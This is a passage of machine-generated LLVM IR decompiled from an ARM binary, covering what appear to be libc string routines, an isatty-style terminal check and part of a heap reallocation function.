dec_label_pc_1169c:                               ; preds = %dec_label_pc_1168c
  %v2_1169c = icmp eq i8 %v3_1168c, 0
  br i1 %v2_1169c, label %dec_label_pc_116ec, label %dec_label_pc_116a4

dec_label_pc_116a4:                               ; preds = %dec_label_pc_1169c
  %v1_116a4 = add i32 %v0_116ac, 1
  %v2_116a4 = inttoptr i32 %v1_116a4 to i8*
  %v3_116a4 = load i8, i8* %v2_116a4, align 1
  %v4_116a4 = zext i8 %v3_116a4 to i32
  %v9_116a8 = icmp eq i32 %v4_116a4, %v1_11614
  br i1 %v9_116a8, label %dec_label_pc_116ec, label %dec_label_pc_116b4

dec_label_pc_116b4:                               ; preds = %dec_label_pc_116a4
  %v2_116b4 = icmp eq i8 %v3_116a4, 0
  br i1 %v2_116b4, label %dec_label_pc_116ec, label %dec_label_pc_116bc

dec_label_pc_116bc:                               ; preds = %dec_label_pc_116b4
  %v1_116bc = add i32 %v0_116ac, 2
  %v2_116bc = inttoptr i32 %v1_116bc to i8*
  %v3_116bc = load i8, i8* %v2_116bc, align 1
  %v4_116bc = zext i8 %v3_116bc to i32
  %v9_116c0 = icmp eq i32 %v4_116bc, %v1_11614
  br i1 %v9_116c0, label %dec_label_pc_116ec, label %dec_label_pc_116cc

dec_label_pc_116cc:                               ; preds = %dec_label_pc_116bc
  %v2_116cc = icmp eq i8 %v3_116bc, 0
  br i1 %v2_116cc, label %dec_label_pc_116ec, label %dec_label_pc_116d4

dec_label_pc_116d4:                               ; preds = %dec_label_pc_116cc
  %v1_116d4 = add i32 %v0_116ac, 3
  %v2_116d4 = inttoptr i32 %v1_116d4 to i8*
  %v3_116d4 = load i8, i8* %v2_116d4, align 1
  %v4_116d4 = zext i8 %v3_116d4 to i32
  %v9_116d8 = icmp eq i32 %v4_116d4, %v1_11614
  br i1 %v9_116d8, label %dec_label_pc_116ec, label %dec_label_pc_116e4

dec_label_pc_116e4:                               ; preds = %dec_label_pc_116d4
  %v2_116e4 = icmp eq i8 %v3_116d4, 0
  br i1 %v2_116e4, label %dec_label_pc_116ec, label %dec_label_pc_11648

dec_label_pc_116ec:                               ; preds = %dec_label_pc_11628, %dec_label_pc_1161c, %dec_label_pc_116e4, %dec_label_pc_116d4, %dec_label_pc_116cc, %dec_label_pc_116bc, %dec_label_pc_116b4, %dec_label_pc_116a4, %dec_label_pc_1169c, %dec_label_pc_1168c
  %v1_116f0 = phi i32 [ %v1_116d4, %dec_label_pc_116e4 ], [ %v1_116d4, %dec_label_pc_116d4 ], [ %v1_116bc, %dec_label_pc_116cc ], [ %v1_116bc, %dec_label_pc_116bc ], [ %v1_116a4, %dec_label_pc_116b4 ], [ %v1_116a4, %dec_label_pc_116a4 ], [ %v0_116ac, %dec_label_pc_1169c ], [ %v0_116ac, %dec_label_pc_1168c ], [ %v0_11630, %dec_label_pc_1161c ], [ %v0_11630, %dec_label_pc_11628 ]
  ret i32 %v1_116f0

; uselistorder directives
  uselistorder i32 %v4_11648, { 1, 0 }
  uselistorder i32 %v2_11648, { 0, 2, 1 }
  uselistorder i32 %v0_116ac, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1163c, { 1, 0 }
  uselistorder i32 %v1_11630, { 1, 0, 2 }
  uselistorder i32 %v0_116342, { 2, 1, 0 }
  uselistorder i32 %v1_11614, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 3, { 2, 3, 1, 4, 26, 27, 60, 28, 29, 30, 31, 32, 33, 37, 34, 7, 38, 61, 5, 55, 9, 56, 8, 57, 10, 39, 47, 35, 59, 36, 25, 40, 41, 42, 43, 13, 44, 45, 12, 46, 11, 48, 51, 49, 14, 50, 15, 52, 16, 53, 17, 54, 21, 18, 19, 20, 22, 6, 58, 0, 23, 24 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder i32 65536, { 0, 1, 3, 2, 8, 4, 9, 5, 10, 6, 11, 7, 12, 13, 14, 18, 15, 19, 16, 20, 17, 21, 44, 45, 43, 46, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 34, 32, 35, 36, 37, 38, 41, 39, 42, 40 }
  uselistorder label %dec_label_pc_116ec, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1168c, { 1, 0 }
  uselistorder label %dec_label_pc_1161c, { 1, 0 }
}

define i32 @function_116fc() local_unnamed_addr {
dec_label_pc_116fc:
  %stack_var_-16 = alloca i32, align 4
  %v3_116fc = load i32, i32* @r4, align 4
  store i32 %v3_116fc, i32* %stack_var_-16, align 4
  %v6_116fc = load i32, i32* @r5, align 4
  %v9_116fc = load i32, i32* @r6, align 4
  %v0_11700 = load i32, i32* @r0, align 4
  %v0_11704 = load i32, i32* @r1, align 4
  store i32 %v0_11704, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_117208 = inttoptr i32 %v0_11700 to i8*
  %v2_117209 = load i8, i8* %v1_117208, align 1
  %v3_1172010 = zext i8 %v2_117209 to i32
  store i32 %v3_1172010, i32* @r1, align 4
  %v2_1172411 = icmp eq i8 %v2_117209, 0
  store i32 %v0_11704, i32* @r0, align 4
  %v1_1172c12 = add i32 %v0_11700, 1
  store i32 %v1_1172c12, i32* @r4, align 4
  br i1 %v2_1172411, label %dec_label_pc_11734, label %dec_label_pc_11710

dec_label_pc_11710:                               ; preds = %dec_label_pc_116fc, %dec_label_pc_1171c
  %v3_1172014 = phi i32 [ %v3_11720, %dec_label_pc_1171c ], [ %v3_1172010, %dec_label_pc_116fc ]
  %v0_1172813 = phi i32 [ %v0_11728.pre, %dec_label_pc_1171c ], [ %v0_11704, %dec_label_pc_116fc ]
  %v2_11710 = call i32 @function_11520(i32 %v0_1172813, i32 %v3_1172014)
  %v2_11714 = icmp eq i32 %v2_11710, 0
  %v0_1171c = load i32, i32* @r5, align 4
  br i1 %v2_11714, label %dec_label_pc_1171c, label %dec_label_pc_11734

dec_label_pc_1171c:                               ; preds = %dec_label_pc_11710
  %v1_1171c = add i32 %v0_1171c, 1
  %v0_11720.pre = load i32, i32* @r4, align 4
  %v0_11728.pre = load i32, i32* @r6, align 4
  store i32 %v1_1171c, i32* @r5, align 4
  %v1_11720 = inttoptr i32 %v0_11720.pre to i8*
  %v2_11720 = load i8, i8* %v1_11720, align 1
  %v3_11720 = zext i8 %v2_11720 to i32
  store i32 %v3_11720, i32* @r1, align 4
  %v2_11724 = icmp eq i8 %v2_11720, 0
  store i32 %v0_11728.pre, i32* @r0, align 4
  %v1_1172c = add i32 %v0_11720.pre, 1
  store i32 %v1_1172c, i32* @r4, align 4
  br i1 %v2_11724, label %dec_label_pc_11734, label %dec_label_pc_11710

dec_label_pc_11734:                               ; preds = %dec_label_pc_1171c, %dec_label_pc_11710, %dec_label_pc_116fc
  %v0_11734 = phi i32 [ 0, %dec_label_pc_116fc ], [ %v0_1171c, %dec_label_pc_11710 ], [ %v1_1171c, %dec_label_pc_1171c ]
  %v2_11738 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11738, i32* @r4, align 4
  store i32 %v6_116fc, i32* @r5, align 4
  store i32 %v9_116fc, i32* @r6, align 4
  ret i32 %v0_11734

; uselistorder directives
  uselistorder i32 %v3_11720, { 1, 0 }
  uselistorder i32 %v0_11728.pre, { 1, 0 }
  uselistorder i32 %v0_11720.pre, { 1, 0 }
  uselistorder label %dec_label_pc_11710, { 1, 0 }
}

define i32 @function_11740(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11740:
  store i32 %arg1, i32* @r0, align 4
  %v1_11744 = urem i32 %arg2, 256
  store i32 %v1_11744, i32* @r4, align 4
  %v2_11744 = icmp eq i32 %v1_11744, 0
  br i1 %v2_11744, label %dec_label_pc_11758, label %dec_label_pc_1176c.preheader

dec_label_pc_1176c.preheader:                     ; preds = %dec_label_pc_11740
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_117743 = call i32 @function_11520(i32 %arg1, i32 %v1_11744)
  %v2_117785 = icmp eq i32 %v2_117743, 0
  br i1 %v2_117785, label %dec_label_pc_11780, label %dec_label_pc_11764

dec_label_pc_11758:                               ; preds = %dec_label_pc_11740
  %v2_1175c = call i32 @function_11520(i32 %arg1, i32 0)
  br label %dec_label_pc_11784

dec_label_pc_11764:                               ; preds = %dec_label_pc_1176c.preheader, %dec_label_pc_11764
  %v2_117746 = phi i32 [ %v2_11774, %dec_label_pc_11764 ], [ %v2_117743, %dec_label_pc_1176c.preheader ]
  store i32 %v2_117746, i32* @r5, align 4
  %v1_11768 = add i32 %v2_117746, 1
  store i32 %v1_11768, i32* @r0, align 4
  %v0_11770 = load i32, i32* @r4, align 4
  %v2_11774 = call i32 @function_11520(i32 %v1_11768, i32 %v0_11770)
  %v2_11778 = icmp eq i32 %v2_11774, 0
  br i1 %v2_11778, label %dec_label_pc_11780, label %dec_label_pc_11764

dec_label_pc_11780:                               ; preds = %dec_label_pc_11764, %dec_label_pc_1176c.preheader
  %v0_11780 = load i32, i32* @r5, align 4
  br label %dec_label_pc_11784

dec_label_pc_11784:                               ; preds = %dec_label_pc_11758, %dec_label_pc_11780
  %storemerge = phi i32 [ %v2_1175c, %dec_label_pc_11758 ], [ %v0_11780, %dec_label_pc_11780 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_11774, { 1, 0 }
  uselistorder i32 %v1_11768, { 1, 0 }
  uselistorder i32 %v1_11744, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_11520, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_11784, { 1, 0 }
  uselistorder label %dec_label_pc_11764, { 1, 0 }
}

define i32 @function_11790(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11790:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_117c02 = load i32, i32* @r0, align 4
  %v1_117c03 = inttoptr i32 %v0_117c02 to i8*
  %v2_117c04 = load i8, i8* %v1_117c03, align 1
  %v2_117c46 = icmp eq i8 %v2_117c04, 0
  br i1 %v2_117c46, label %dec_label_pc_117d0, label %dec_label_pc_117a4.preheader

dec_label_pc_1179c:                               ; preds = %dec_label_pc_117a4
  %v1_117ac = add i32 %v0_117ac, 1
  %v9_1179c = icmp eq i8 %v0_1179c10.in, %v2_117a4
  br i1 %v9_1179c, label %dec_label_pc_117b8, label %dec_label_pc_117a4

dec_label_pc_117a4:                               ; preds = %dec_label_pc_117a4.preheader, %dec_label_pc_1179c
  %v0_117ac = phi i32 [ %tmp, %dec_label_pc_117a4.preheader ], [ %v1_117ac, %dec_label_pc_1179c ]
  %v1_117a4 = inttoptr i32 %v0_117ac to i8*
  %v2_117a4 = load i8, i8* %v1_117a4, align 1
  %v2_117a8 = icmp eq i8 %v2_117a4, 0
  br i1 %v2_117a8, label %dec_label_pc_117d0, label %dec_label_pc_1179c

dec_label_pc_117b8:                               ; preds = %dec_label_pc_1179c
  %v1_117b8 = add i32 %v0_117b8, 1
  %v1_117bc = add i32 %v0_117bc, 1
  %v1_117c0 = inttoptr i32 %v1_117bc to i8*
  %v2_117c0 = load i8, i8* %v1_117c0, align 1
  %v2_117c4 = icmp eq i8 %v2_117c0, 0
  br i1 %v2_117c4, label %dec_label_pc_117d0, label %dec_label_pc_117a4.preheader

dec_label_pc_117a4.preheader:                     ; preds = %dec_label_pc_11790, %dec_label_pc_117b8
  %v0_117bc = phi i32 [ %v1_117bc, %dec_label_pc_117b8 ], [ %v0_117c02, %dec_label_pc_11790 ]
  %v0_117b8 = phi i32 [ %v1_117b8, %dec_label_pc_117b8 ], [ 0, %dec_label_pc_11790 ]
  %v0_1179c10.in = phi i8 [ %v2_117c0, %dec_label_pc_117b8 ], [ %v2_117c04, %dec_label_pc_11790 ]
  br label %dec_label_pc_117a4

dec_label_pc_117d0:                               ; preds = %dec_label_pc_117b8, %dec_label_pc_117a4, %dec_label_pc_11790
  %v0_117d0 = phi i32 [ 0, %dec_label_pc_11790 ], [ %v0_117b8, %dec_label_pc_117a4 ], [ %v1_117b8, %dec_label_pc_117b8 ]
  ret i32 %v0_117d0

; uselistorder directives
  uselistorder i8 %v2_117a4, { 1, 0 }
  uselistorder i32 %v0_117ac, { 1, 0 }
  uselistorder i8 0, { 33, 32, 24, 34, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 5, 35, 37, 36, 25, 38, 39, 26, 19, 41, 40, 27, 43, 2, 42, 28, 0, 20, 44, 21, 45, 29, 46, 47, 48, 30, 49, 56, 55, 54, 53, 58, 57, 52, 51, 59, 50, 60, 22, 61, 62, 63, 64, 65, 66, 67, 23, 31, 7, 68, 3, 69, 6, 70, 4, 71, 72, 74, 73, 75 }
  uselistorder label %dec_label_pc_117a4.preheader, { 1, 0 }
}

define i32 @function_117dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_117dc:
  %stack_var_-68 = alloca i32, align 4
  %v2_117e4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_117e4, i32* @r1, align 4
  %v0_117e8 = call i32 @function_11800()
  %v1_117ec = sub i32 1, %v0_117e8
  %v2_117ec = icmp ult i32 %v0_117e8, 2
  br i1 %v2_117ec, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_117dc
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_117dc, %bb
  %v1_117fc = phi i32 [ %v1_117ec, %dec_label_pc_117dc ], [ 0, %bb ]
  ret i32 %v1_117fc

; uselistorder directives
  uselistorder i32 %v0_117e8, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_11800() local_unnamed_addr {
dec_label_pc_11800:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_11800 = load i32, i32* @r4, align 4
  %v6_11800 = load i32, i32* @r5, align 4
  %v9_11800 = load i32, i32* @r6, align 4
  %v2_11808 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1180c = load i32, i32* @r1, align 4
  store i32 %v0_1180c, i32* @r4, align 4
  store i32 %v2_11808, i32* @r2, align 4
  store i32 21505, i32* @r1, align 4
  %v0_11818 = call i32 @function_12070()
  store i32 %v0_11818, i32* %r0.global-to-local, align 4
  store i32 %v0_11818, i32* @r5, align 4
  %v2_1181c = icmp eq i32 %v0_11818, 0
  br i1 %v2_1181c, label %dec_label_pc_11824, label %dec_label_pc_11868

dec_label_pc_11824:                               ; preds = %dec_label_pc_11800
  %v4_11830 = zext i8 %tmp to i32
  store i32 %v4_11830, i32* %ip.global-to-local, align 4
  %v3_11834 = load i32, i32* %stack_var_-52, align 4
  %v1_11838 = load i32, i32* @r4, align 4
  %v2_11838 = add i32 %v1_11838, 4
  %v3_11838 = inttoptr i32 %v2_11838 to i32*
  %v0_1183c = load i32, i32* %r1.global-to-local, align 4
  %v1_1183c = load i32, i32* @r4, align 4
  %v2_1183c = add i32 %v1_1183c, 8
  %v3_1183c = inttoptr i32 %v2_1183c to i32*
  store i32 %v0_1183c, i32* %v3_1183c, align 4
  %v0_11840 = load i32, i32* %r0.global-to-local, align 4
  %v1_11840 = load i32, i32* @r4, align 4
  %v2_11840 = add i32 %v1_11840, 12
  %v3_11840 = inttoptr i32 %v2_11840 to i32*
  store i32 %v0_11840, i32* %v3_11840, align 4
  %v2_11844 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_11844, i32* @r1, align 4
  %v1_1184c = load i32, i32* @r4, align 4
  %v2_1184c = inttoptr i32 %v1_1184c to i32*
  store i32 %v3_11834, i32* %v2_1184c, align 4
  %v0_11850 = load i32, i32* %ip.global-to-local, align 4
  %v1_11850 = trunc i32 %v0_11850 to i8
  %v2_11850 = load i32, i32* @r4, align 4
  %v3_11850 = add i32 %v2_11850, 16
  %v4_11850 = inttoptr i32 %v3_11850 to i8*
  store i8 %v1_11850, i8* %v4_11850, align 1
  %v0_11854 = load i32, i32* @r4, align 4
  %v1_11854 = add i32 %v0_11854, 17
  store i32 %v1_11854, i32* %r0.global-to-local, align 4
  %v4_11858 = call i32 @function_124e4(i32 %v1_11854, i32 %v2_11844, i32 19, i32 %v3_11834)
  store i32 %v4_11858, i32* %r0.global-to-local, align 4
  %v0_1185c = load i32, i32* @r5, align 4
  store i32 %v0_1185c, i32* %r1.global-to-local, align 4
  %v3_11864 = inttoptr i32 %v4_11858 to i8*
  %v4_11864 = call i32 @function_bff0(i8* %v3_11864, i32 %v0_1185c, i32 13)
  store i32 %v4_11864, i32* %r0.global-to-local, align 4
  %v0_11868.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11868

dec_label_pc_11868:                               ; preds = %dec_label_pc_11800, %dec_label_pc_11824
  %v0_11868 = phi i32 [ %v0_11818, %dec_label_pc_11800 ], [ %v0_11868.pre, %dec_label_pc_11824 ]
  store i32 %v0_11868, i32* %r0.global-to-local, align 4
  store i32 %v3_11800, i32* @r4, align 4
  store i32 %v6_11800, i32* @r5, align 4
  store i32 %v9_11800, i32* @r6, align 4
  ret i32 %v0_11868

; uselistorder directives
  uselistorder i32 %v0_11868, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 13, { 2, 5, 0, 1, 4, 6, 7, 8, 3 }
  uselistorder i32 17, { 4, 0, 5, 6, 7, 1, 10, 8, 11, 9, 12, 13, 2, 14, 3 }
  uselistorder label %dec_label_pc_11868, { 1, 0 }
}

define i32 @function_1187c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1187c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1187c = load i32, i32* @r4, align 4
  %v6_1187c = load i32, i32* @r5, align 4
  %v9_1187c = load i32, i32* @r6, align 4
  %v12_1187c = load i32, i32* @r7, align 4
  %v15_1187c = load i32, i32* @r8, align 4
  %v18_1187c = load i32, i32* @sb, align 4
  %v21_1187c = load i32, i32* @sl, align 4
  %v24_1187c = load i32, i32* @fp, align 4
  %v27_1187c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_11888 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_11888, label %dec_label_pc_1189c, label %dec_label_pc_118ac

dec_label_pc_1189c:                               ; preds = %dec_label_pc_1187c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_118a0 = call i32 @function_c77c(i32 %arg2)
  store i32 %v1_118a0, i32* %r0.global-to-local, align 4
  store i32 %v1_118a0, i32* @r4, align 4
  br label %dec_label_pc_11c0c

dec_label_pc_118ac:                               ; preds = %dec_label_pc_1187c
  %v2_118ac = icmp eq i32 %arg2, 0
  br i1 %v2_118ac, label %dec_label_pc_118b4, label %dec_label_pc_118c0

dec_label_pc_118b4:                               ; preds = %dec_label_pc_118ac
  %v0_118b4 = call i32 @function_d458()
  store i32 %v0_118b4, i32* %r0.global-to-local, align 4
  %v0_118b8 = load i32, i32* @r6, align 4
  store i32 %v0_118b8, i32* @r4, align 4
  br label %dec_label_pc_11c0c

dec_label_pc_118c0:                               ; preds = %dec_label_pc_118ac
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %ip.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_118c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 108) to i32*), align 4
  store i32 %v4_118c8, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_118c8, i32* %r2.global-to-local, align 4
  %v4_118d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 68) to i32*), align 4
  store i32 %v4_118d4, i32* %r1.global-to-local, align 4
  %v2_118d8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_118d8, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_118e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 112) to i32*), align 4
  store i32 %v4_118e0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_118e0)
  %v0_118ec = load i32, i32* @r4, align 4
  store i32 %v0_118ec, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r1.global-to-local, align 4
  %v4_118f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 16) to i32*), align 4
  store i32 %v4_118f8, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_11904.509 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_118f8)
  %v0_11904 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_11904, -32
  br i1 %tmp36, label %dec_label_pc_11928, label %dec_label_pc_1190c

dec_label_pc_1190c:                               ; preds = %dec_label_pc_118c0
  store i32 47548, i32* %r2.global-to-local, align 4
  %v0_11910 = call i32 @function_f150()
  store i32 %v0_11910, i32* %r0.global-to-local, align 4
  %v3_11914 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_11914 = sext i16 %v3_11914 to i32
  store i32 %v4_11914, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_11920 = add i32 %v4_11914, %v0_11910
  %v4_11920 = inttoptr i32 %v3_11920 to i32*
  store i32 12, i32* %v4_11920, align 4
  br label %dec_label_pc_11c0c

dec_label_pc_11928:                               ; preds = %dec_label_pc_118c0
  %v1_11928 = add i32 %v0_11904, 11
  store i32 %v1_11928, i32* %r0.global-to-local, align 4
  %v0_1192c = load i32, i32* @r5, align 4
  %v1_1192c = add i32 %v0_1192c, -4
  %v2_1192c = inttoptr i32 %v1_1192c to i32*
  %v3_1192c = load i32, i32* %v2_1192c, align 4
  store i32 %v3_1192c, i32* %r2.global-to-local, align 4
  %v2_11930 = icmp ugt i32 %v1_11928, 14
  %v7_11930 = icmp eq i32 %v1_11928, 15
  %v2_11934 = xor i1 %v2_11930, true
  %v3_11934 = or i1 %v7_11930, %v2_11934
  br i1 %v3_11934, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_11928
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_11928, %bb
  %v2_11938 = xor i1 %v7_11930, true
  %v3_11938 = and i1 %v2_11930, %v2_11938
  br i1 %v3_11938, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_11938 = and i32 %v1_11928, -8
  store i32 %v5_11938, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_1193c = and i32 %v3_1192c, 2
  %v2_1193c = icmp eq i32 %v1_1193c, 0
  %v1_11940 = add i32 %v0_1192c, -8
  store i32 %v1_11940, i32* @sl, align 4
  %v1_11944 = and i32 %v3_1192c, -4
  store i32 %v1_11944, i32* @r6, align 4
  br i1 %v2_1193c, label %dec_label_pc_1194c, label %dec_label_pc_11b24

dec_label_pc_1194c:                               ; preds = %bb29
  %v1_1194c = load i32, i32* @sb, align 4
  %v3_1194c = icmp ult i32 %v1_11944, %v1_1194c
  br i1 %v3_1194c, label %dec_label_pc_11958, label %bb30

bb30:                                             ; preds = %dec_label_pc_1194c
  store i32 %v1_11944, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11abc

dec_label_pc_11958:                               ; preds = %dec_label_pc_1194c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %ip.global-to-local, align 4
  %v4_11960 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_11960, i32* %r0.global-to-local, align 4
  %v1_11964 = add i32 %v4_11960, 44
  %v2_11964 = inttoptr i32 %v1_11964 to i32*
  %v3_11964 = load i32, i32* %v2_11964, align 4
  store i32 %v3_11964, i32* %r3.global-to-local, align 4
  %v2_11968 = add i32 %v1_11944, %v1_11940
  store i32 %v2_11968, i32* @r4, align 4
  %v9_1196c = icmp eq i32 %v2_11968, %v3_11964
  %v1_11970 = add i32 %v2_11968, 4
  %v2_11970 = inttoptr i32 %v1_11970 to i32*
  %v3_11970 = load i32, i32* %v2_11970, align 4
  store i32 %v3_11970, i32* %r1.global-to-local, align 4
  br i1 %v9_1196c, label %dec_label_pc_11978, label %dec_label_pc_119b4

dec_label_pc_11978:                               ; preds = %dec_label_pc_11958
  %v1_11978 = and i32 %v3_11970, -4
  %v2_1197c = add i32 %v1_11978, %v1_11944
  store i32 %v2_1197c, i32* %r1.global-to-local, align 4
  %v1_11980 = add i32 %v1_1194c, 16
  store i32 %v1_11980, i32* %r3.global-to-local, align 4
  %v3_11984 = icmp ult i32 %v2_1197c, %v1_11980
  br i1 %v3_11984, label %dec_label_pc_11a08, label %dec_label_pc_1198c

dec_label_pc_1198c:                               ; preds = %dec_label_pc_11978
  %v2_1198c = sub i32 %v2_1197c, %v1_1194c
  %v1_11990 = urem i32 %v3_1192c, 2
  %v2_11994 = add i32 %v1_1194c, %v1_11940
  store i32 %v2_11994, i32* %r1.global-to-local, align 4
  %v2_11998 = or i32 %v1_1194c, %v1_11990
  store i32 %v2_11998, i32* %r2.global-to-local, align 4
  %v1_1199c = or i32 %v2_1198c, 1
  store i32 %v1_1199c, i32* %r3.global-to-local, align 4
  store i32 %v0_1192c, i32* @r4, align 4
  store i32 %v2_11998, i32* %v2_1192c, align 4
  %v0_119a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_119a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_119a8 = add i32 %v1_119a8, 44
  %v3_119a8 = inttoptr i32 %v2_119a8 to i32*
  store i32 %v0_119a8, i32* %v3_119a8, align 4
  %v0_119ac = load i32, i32* %r3.global-to-local, align 4
  %v1_119ac = load i32, i32* %r1.global-to-local, align 4
  %v2_119ac = add i32 %v1_119ac, 4
  %v3_119ac = inttoptr i32 %v2_119ac to i32*
  store i32 %v0_119ac, i32* %v3_119ac, align 4
  br label %dec_label_pc_11bf0

dec_label_pc_119b4:                               ; preds = %dec_label_pc_11958
  %v1_119b4 = and i32 %v3_11970, -2
  %v2_119b8 = add i32 %v1_119b4, %v2_11968
  store i32 %v2_119b8, i32* %r3.global-to-local, align 4
  %v1_119bc = add i32 %v2_119b8, 4
  %v2_119bc = inttoptr i32 %v1_119bc to i32*
  %v3_119bc = load i32, i32* %v2_119bc, align 4
  store i32 %v3_119bc, i32* %r3.global-to-local, align 4
  %v1_119c0 = urem i32 %v3_119bc, 2
  %v2_119c0 = icmp eq i32 %v1_119c0, 0
  br i1 %v2_119c0, label %dec_label_pc_119c8, label %dec_label_pc_11a08

dec_label_pc_119c8:                               ; preds = %dec_label_pc_119b4
  %v1_119c8 = and i32 %v3_11970, -4
  store i32 %v1_119c8, i32* %r3.global-to-local, align 4
  %v2_119cc = add i32 %v1_119c8, %v1_11944
  store i32 %v2_119cc, i32* %r0.global-to-local, align 4
  %v3_119d0 = icmp ult i32 %v2_119cc, %v1_1194c
  br i1 %v3_119d0, label %dec_label_pc_11a08, label %dec_label_pc_119d8

dec_label_pc_119d8:                               ; preds = %dec_label_pc_119c8
  %v1_119d8 = add i32 %v1_11944, %v0_1192c
  %v2_119d8 = inttoptr i32 %v1_119d8 to i32*
  %v3_119d8 = load i32, i32* %v2_119d8, align 4
  store i32 %v3_119d8, i32* %r1.global-to-local, align 4
  %v1_119dc = add i32 %v3_119d8, 12
  %v2_119dc = inttoptr i32 %v1_119dc to i32*
  %v3_119dc = load i32, i32* %v2_119dc, align 4
  store i32 %v3_119dc, i32* %r3.global-to-local, align 4
  %v9_119e0 = icmp eq i32 %v3_119dc, %v2_11968
  %v1_119e4 = add i32 %v2_11968, 12
  %v2_119e4 = inttoptr i32 %v1_119e4 to i32*
  %v3_119e4 = load i32, i32* %v2_119e4, align 4
  store i32 %v3_119e4, i32* %r2.global-to-local, align 4
  br i1 %v9_119e0, label %dec_label_pc_119ec, label %dec_label_pc_119f8

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119d8
  %v1_119ec = add i32 %v3_119e4, 8
  %v2_119ec = inttoptr i32 %v1_119ec to i32*
  %v3_119ec = load i32, i32* %v2_119ec, align 4
  store i32 %v3_119ec, i32* %r3.global-to-local, align 4
  %v9_119f0 = icmp eq i32 %v3_119ec, %v2_11968
  br i1 %v9_119f0, label %dec_label_pc_119fc, label %dec_label_pc_119f8

dec_label_pc_119f8:                               ; preds = %dec_label_pc_119d8, %dec_label_pc_119ec
  %v0_119f8 = call i32 @function_d6d4()
  store i32 %v0_119f8, i32* %r0.global-to-local, align 4
  %v0_119fc.pre = load i32, i32* @r1, align 4
  %v1_119fc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_119fc

